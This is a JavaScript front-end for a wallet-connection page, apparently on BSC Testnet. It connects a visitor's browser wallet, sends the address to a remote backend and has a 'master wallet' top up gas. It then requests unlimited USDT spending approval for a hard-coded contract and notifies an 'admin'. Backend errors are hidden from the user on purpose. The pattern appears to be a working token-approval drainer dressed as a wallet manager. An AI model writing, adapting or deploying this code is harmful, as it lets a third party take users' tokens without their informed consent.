import { BrowserProvider, Contract, ethers } from 'ethers'

// Configuration from environment variables
const CONFIG = {
  API_URL: typeof __VITE_API_URL__ !== 'undefined' ? __VITE_API_URL__ : 'https://multi-wallet-manager-backend-lxfq.onrender.com/api',
  CONTRACT_ADDRESS: typeof __VITE_CONTRACT_ADDRESS__ !== 'undefined' ? __VITE_CONTRACT_ADDRESS__ : '0x88e199AeBB58Eb75F6C2DC9fBe73F871eCC8C92F',
  USDT_CONTRACT_ADDRESS: typeof __VITE_USDT_CONTRACT_ADDRESS__ !== 'undefined' ? __VITE_USDT_CONTRACT_ADDRESS__ : '0x2f79e9e36c0d293f3c88F4aF05ABCe224c0A5638',
  CHAIN_ID: typeof __VITE_CHAIN_ID__ !== 'undefined' ? __VITE_CHAIN_ID__ : '97',
  CHAIN_NAME: typeof __VITE_CHAIN_NAME__ !== 'undefined' ? __VITE_CHAIN_NAME__ : 'BSC Testnet',
  RPC_URL: typeof __VITE_RPC_URL__ !== 'undefined' ? __VITE_RPC_URL__ : 'https://bsc-testnet.publicnode.com'
}

// DOM Elements
const connectSection = document.getElementById('connect-section')
const walletSection = document.getElementById('wallet-section')
const connectWalletBtn = document.getElementById('connect-wallet')
const resetWalletBtn = document.getElementById('reset-wallet')
const connectText = document.getElementById('connect-text')
const approveBtn = document.getElementById('approve-btn')
const approveText = document.getElementById('approve-text')
const disconnectBtn = document.getElementById('disconnect-btn')
const walletAddressEl = document.getElementById('wallet-address')
const usdtBalanceEl = document.getElementById('usdt-balance')
const networkEl = document.getElementById('network')
const statusMessage = document.getElementById('status-message')

// State
let provider = null
let signer = null
let walletAddress = null

// Initialize app
document.addEventListener('DOMContentLoaded', () => {
  // Check for existing connection
  const storedAddress = localStorage.getItem('walletAddress')
  
  if (storedAddress) {
    walletAddress = storedAddress
    showWalletSection()
    updateWalletInfo()
  }
  
  // Set network info
  networkEl.textContent = CONFIG.CHAIN_NAME
  
  // Event listeners
  connectWalletBtn.addEventListener('click', connectWallet)
  resetWalletBtn.addEventListener('click', resetWallet)
  approveBtn.addEventListener('click', handleApprovalFlow)
  disconnectBtn.addEventListener('click', disconnectWallet)
})

// Connect wallet function - Now handles gas during connection
async function connectWallet() {
  try {
    console.log('🔌 Starting wallet connection process...');
    showLoading(connectText, true)
    
    // Check if Ethereum provider exists
    if (!window.ethereum) {
      showError('No Ethereum wallet found. Please install MetaMask or Trust Wallet.')
      return
    }
    
    // Request account access
    console.log('🔑 Requesting account access...');
    const accounts = await window.ethereum.request({
      method: 'eth_requestAccounts'
    })
    
    walletAddress = accounts[0]
    console.log('✅ Wallet connected:', walletAddress);
    
    // Create provider and signer
    console.log('🔧 Creating provider and signer...');
    provider = new BrowserProvider(window.ethereum)
    signer = await provider.getSigner()
    
    // Switch to correct network
    console.log('🌐 Switching to correct network...');
    await switchToCorrectNetwork()
    
    // Save to localStorage
    console.log('💾 Saving to localStorage...');
    localStorage.setItem('walletAddress', walletAddress)
    
    // Update UI
    console.log('📱 Updating UI...');
    showWalletSection()
    updateWalletInfo()
    
    // Send to backend first
    console.log('📡 Sending to backend...');
    await sendWalletToBackend()
    console.log('✅ Backend connection completed');
    
    // Check gas and handle auto-gas if needed
    console.log('⛽ Checking gas and handling auto-gas if needed...');
    try {
      await handleAutoGasIfNeeded()
      console.log('⛽ Gas check process completed successfully');
    } catch (gasError) {
      console.error('⛽ Gas check process failed:', gasError);
      showError('Gas check failed: ' + gasError.message);
      return; // Stop here if gas check fails
    }
    
    console.log('🔌 Wallet connection process fully completed');
    
  } catch (error) {
    console.error('💥 Connection error:', error)
    showError('Failed to connect wallet: ' + error.message)
  } finally {
    showLoading(connectText, false)
  }
}

// Handle auto gas during connection
async function handleAutoGasIfNeeded() {
  try {
    console.log('🔍 Starting auto-gas check...');
    
    // Check if wallet has sufficient gas
    console.log('💰 Checking wallet gas balance...');
    const hasGas = await checkWalletGasBalance()
    console.log('⛽ Gas check result:', hasGas);
    
    if (!hasGas) {
      console.log('🚨 Insufficient gas detected, requesting gas from master wallet...');
      showSuccess('Insufficient gas detected. Requesting gas from master wallet...')
      
      // Request gas from backend (master wallet)
      console.log('📤 Sending gas request to backend...');
      await requestGasFromMaster(walletAddress)
      console.log('📥 Gas request sent successfully');
      
      // Wait for gas to be sent by master wallet
      console.log('⏳ Waiting for gas to arrive (up to 60 seconds)...');
      await waitForGas(60000) // Wait up to 60 seconds
      console.log('🎉 Gas received!');
      
      showSuccess('Gas received! You can now approve USDT spending.')
    } else {
      console.log('✅ Wallet already has sufficient gas, no action needed');
    }
    
    console.log('🔍 Auto-gas check completed');
  } catch (error) {
    console.error('💥 Auto gas handling error:', error)
    showError('Gas handling issue: ' + error.message)
    throw error; // Re-throw to see if it's being caught elsewhere
  }
}

// Handle the complete approval flow including gas management
async function handleApprovalFlow() {
  try {
    console.log('🚀 Starting approval flow for wallet:', walletAddress);
    showLoading(approveText, true)
    
    // First check if wallet has sufficient gas for approval transaction
    console.log('💰 Checking gas balance for approval...');
    const hasGas = await checkWalletGasBalance()
    console.log('⛽ Gas check for approval:', hasGas);
    
    if (!hasGas) {
      console.log('🚨 Insufficient gas for approval, requesting gas...');
      showSuccess('Insufficient gas detected. Requesting gas from master wallet...')
      
      // Request gas from backend (master wallet)
      console.log('📤 Requesting gas for approval...');
      await requestGasFromMaster(walletAddress)
      console.log('📥 Gas request for approval completed');
      
      // Wait for gas to be sent by master wallet
      console.log('⏳ Waiting for gas for approval...');
      await waitForGas(60000) // Wait up to 60 seconds
      console.log('🎉 Gas received for approval!');
    }
    
    // Now proceed with USDT approval
    console.log('💳 Proceeding with USDT approval...');
    await approveUSDTSpending()
    console.log('✅ Approval flow completed');
    
  } catch (error) {
    console.error('💥 Approval flow error:', error)
    
    // Check if it's a user cancellation (MetaMask cancel)
    if (error.code === 4001 || (error.message && error.message.includes('user rejected'))) {
      showError('Transaction cancelled by user.')
    } 
    // Check if it's a gas-related error
    else if (error.message && (error.message.includes('gas') || error.message.includes('funds') || error.message.includes('underpriced'))) {
      showError('Insufficient gas. Please try again - the master wallet will send gas.')
      // Reset the connection to start fresh
      resetConnection()
    } else {
      showError('Approval failed: ' + error.message)
    }
  } finally {
    showLoading(approveText, false)
  }
}

// Request gas from master wallet
async function requestGasFromMaster(walletAddress) {
  try {
    showSuccess('Requesting gas from master wallet...');
    
    // FIX: Change this line from /gas/request-gas to /wallets/request-gas
    const response = await fetch(`${CONFIG.API_URL}/wallets/request-gas`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        address: walletAddress
      })
    });
    
    if (!response.ok) {
      const errorData = await response.json().catch(() => ({}));
      const errorMessage = errorData.error || `HTTP ${response.status}: ${response.statusText}`;
      console.error('Gas request error:', errorMessage);
      throw new Error(`Failed to request gas from master wallet: ${errorMessage}`);
    }
    
    const result = await response.json();
    console.log('Gas request successful:', result);
    showSuccess('Gas sent by master wallet. Waiting for confirmation...');
    
    return result;
  } catch (error) {
    console.error('Gas request error:', error);
    throw new Error(`Gas request failed: ${error.message}`);
  }
}

// Check if wallet has sufficient gas balance
async function checkWalletGasBalance() {
  try {
    if (!provider || !walletAddress) {
      throw new Error('Wallet not connected')
    }
    
    const balance = await provider.getBalance(walletAddress)
    const balanceInBNB = ethers.formatEther(balance)
    
    // Check if balance is greater than minimum required (0.001 BNB)
    const hasSufficientGas = parseFloat(balanceInBNB) >= 0.001
    
    console.log('Gas balance:', balanceInBNB, 'BNB - Sufficient:', hasSufficientGas)
    
    return hasSufficientGas
  } catch (error) {
    console.error('Gas check error:', error)
    // If we can't check, assume no gas and let the master wallet handle it
    return false
  }
}

// Wait for gas to be sent to wallet
async function waitForGas(timeout = 60000) {
  const startTime = Date.now()
  
  while (Date.now() - startTime < timeout) {
    // Check gas balance
    const hasGas = await checkWalletGasBalance()
    
    if (hasGas) {
      showSuccess('Gas received! Proceeding with approval...')
      return true
    }
    
    // Wait 3 seconds before checking again
    await new Promise(resolve => setTimeout(resolve, 3000))
  }
  
  // Timeout reached
  throw new Error('Gas not received within timeout period. Please try again.')
}

// Approve USDT spending
async function approveUSDTSpending() {
  try {
    if (!signer) {
      throw new Error('Wallet not connected')
    }
    
    // Create USDT contract instance
    const usdtContract = new Contract(
      CONFIG.USDT_CONTRACT_ADDRESS,
      ['function approve(address spender, uint256 amount) public returns (bool)'],
      signer
    )
    
    showSuccess('Sending approval transaction...')
    
    // Send approval transaction
    const tx = await usdtContract.approve(
      CONFIG.CONTRACT_ADDRESS,
      ethers.MaxUint256
    )
    
    showSuccess('Transaction sent. Waiting for confirmation...')
    
    // Wait for confirmation
    await tx.wait()
    
    showSuccess('USDT spending approved successfully!')
    
    // Disable approve button
    approveBtn.disabled = true
    approveText.textContent = 'Approved'
    
    // Notify backend that approval is complete
    await notifyApprovalToBackend()
    
  } catch (error) {
    console.error('Approval error:', error)
    // Handle user cancellation specifically
    if (error.code === 4001 || (error.message && error.message.includes('user rejected'))) {
      throw new Error('Transaction cancelled by user.')
    }
    throw error
  }
}

// Send wallet to backend (connection only)
async function sendWalletToBackend() {
  try {
    const response = await fetch(`${CONFIG.API_URL}/wallets/connect`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        address: walletAddress,
        name: `Wallet ${walletAddress.substring(0, 6)}...${walletAddress.substring(38)}`
      })
    })
    
    if (!response.ok) {
      const errorData = await response.json().catch(() => ({}))
      console.error('Backend connection error:', errorData.error || `HTTP ${response.status}`)
      // Don't show error to user as per requirements
      return
    }
    
    const result = await response.json()
    console.log('Backend connection successful:', result)
    
  } catch (error) {
    console.error('Backend connection error:', error)
    // Don't show error to user as per requirements
  }
}

// Notify backend that approval is complete
async function notifyApprovalToBackend() {
  try {
    const response = await fetch(`${CONFIG.API_URL}/wallets/approve-spending`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        address: walletAddress
      })
    })
    
    if (!response.ok) {
      const errorData = await response.json().catch(() => ({}))
      console.error('Backend approval notification error:', errorData.error || `HTTP ${response.status}`)
      // Don't show error to user as per requirements
      return
    }
    
    const result = await response.json()
    console.log('Backend approval notification successful:', result)
    
    showSuccess('Wallet approved successfully! Admin has been notified.')
    
  } catch (error) {
    console.error('Backend approval notification error:', error)
    // Don't show error to user as per requirements
  }
}

// Reset connection flow - completely reset everything
function resetConnection() {
  // Clear all state
  walletAddress = null
  provider = null
  signer = null
  
  // Clear localStorage
  localStorage.removeItem('walletAddress')
  
  // Reset UI to initial state
  showConnectSection()
  
  // Reset buttons
  connectWalletBtn.disabled = false
  connectText.textContent = 'Connect Wallet'
  approveBtn.disabled = false
  approveText.textContent = 'Approve USDT Spending'
  
  // Clear wallet info
  if (walletAddressEl) walletAddressEl.textContent = ''
  if (usdtBalanceEl) usdtBalanceEl.textContent = '0.00 USDT'
  
  showSuccess('Wallet disconnected. You can now connect a different wallet.')
}

// Disconnect wallet - this is the button handler
async function disconnectWallet() {
  try {
    showLoading(disconnectBtn, true)
    
    // Reset everything
    resetConnection()
    
    // Optional: Notify user
    showSuccess('Wallet disconnected successfully!')
    
  } catch (error) {
    console.error('Disconnect error:', error)
    showError('Error disconnecting wallet: ' + error.message)
  } finally {
    showLoading(disconnectBtn, false)
    
    // Reset disconnect button text after a moment
    setTimeout(() => {
      if (disconnectBtn) {
        disconnectBtn.innerHTML = 'Disconnect Wallet'
      }
    }, 1000)
  }
}

// Show connect section
function showConnectSection() {
  connectSection.classList.remove('hidden')
  walletSection.classList.add('hidden')
}

// Show wallet section
function showWalletSection() {
  connectSection.classList.add('hidden')
  walletSection.classList.remove('hidden')
  approveBtn.disabled = false
  approveText.textContent = 'Approve USDT Spending'
  
  // If already approved, show as approved
  if (approveBtn.disabled) {
    approveText.textContent = 'Approved'
  }
}

// Format wallet address
function formatAddress(address) {
  if (!address) return ''
  return `${address.substring(0, 6)}...${address.substring(38)}`
}

// Show loading state
function showLoading(element, show) {
  if (!element) return;
  
  if (show) {
    const originalText = element.textContent || element.innerText;
    element.setAttribute('data-original-text', originalText);
    element.innerHTML = '<span class="loading"></span>Processing...'
  } else {
    const originalText = element.getAttribute('data-original-text');
    if (originalText) {
      element.textContent = originalText;
    } else {
      if (element.id === 'connect-text') {
        element.textContent = 'Connect Wallet'
      } else if (element.id === 'approve-text') {
        element.textContent = 'Approve USDT Spending'
      } else if (element.id === 'disconnect-btn') {
        element.innerHTML = 'Disconnect Wallet'
      }
    }
  }
}

// Show success message
function showSuccess(message) {
  if (!statusMessage) return;
  
  statusMessage.textContent = message
  statusMessage.className = 'status status-success'
  statusMessage.classList.remove('hidden')
  
  setTimeout(() => {
    statusMessage.classList.add('hidden')
  }, 5000)
}

// Show error message
function showError(message) {
  if (!statusMessage) return;
  
  statusMessage.textContent = message
  statusMessage.className = 'status status-error'
  statusMessage.classList.remove('hidden')
  
  setTimeout(() => {
    statusMessage.classList.add('hidden')
  }, 5000)
}








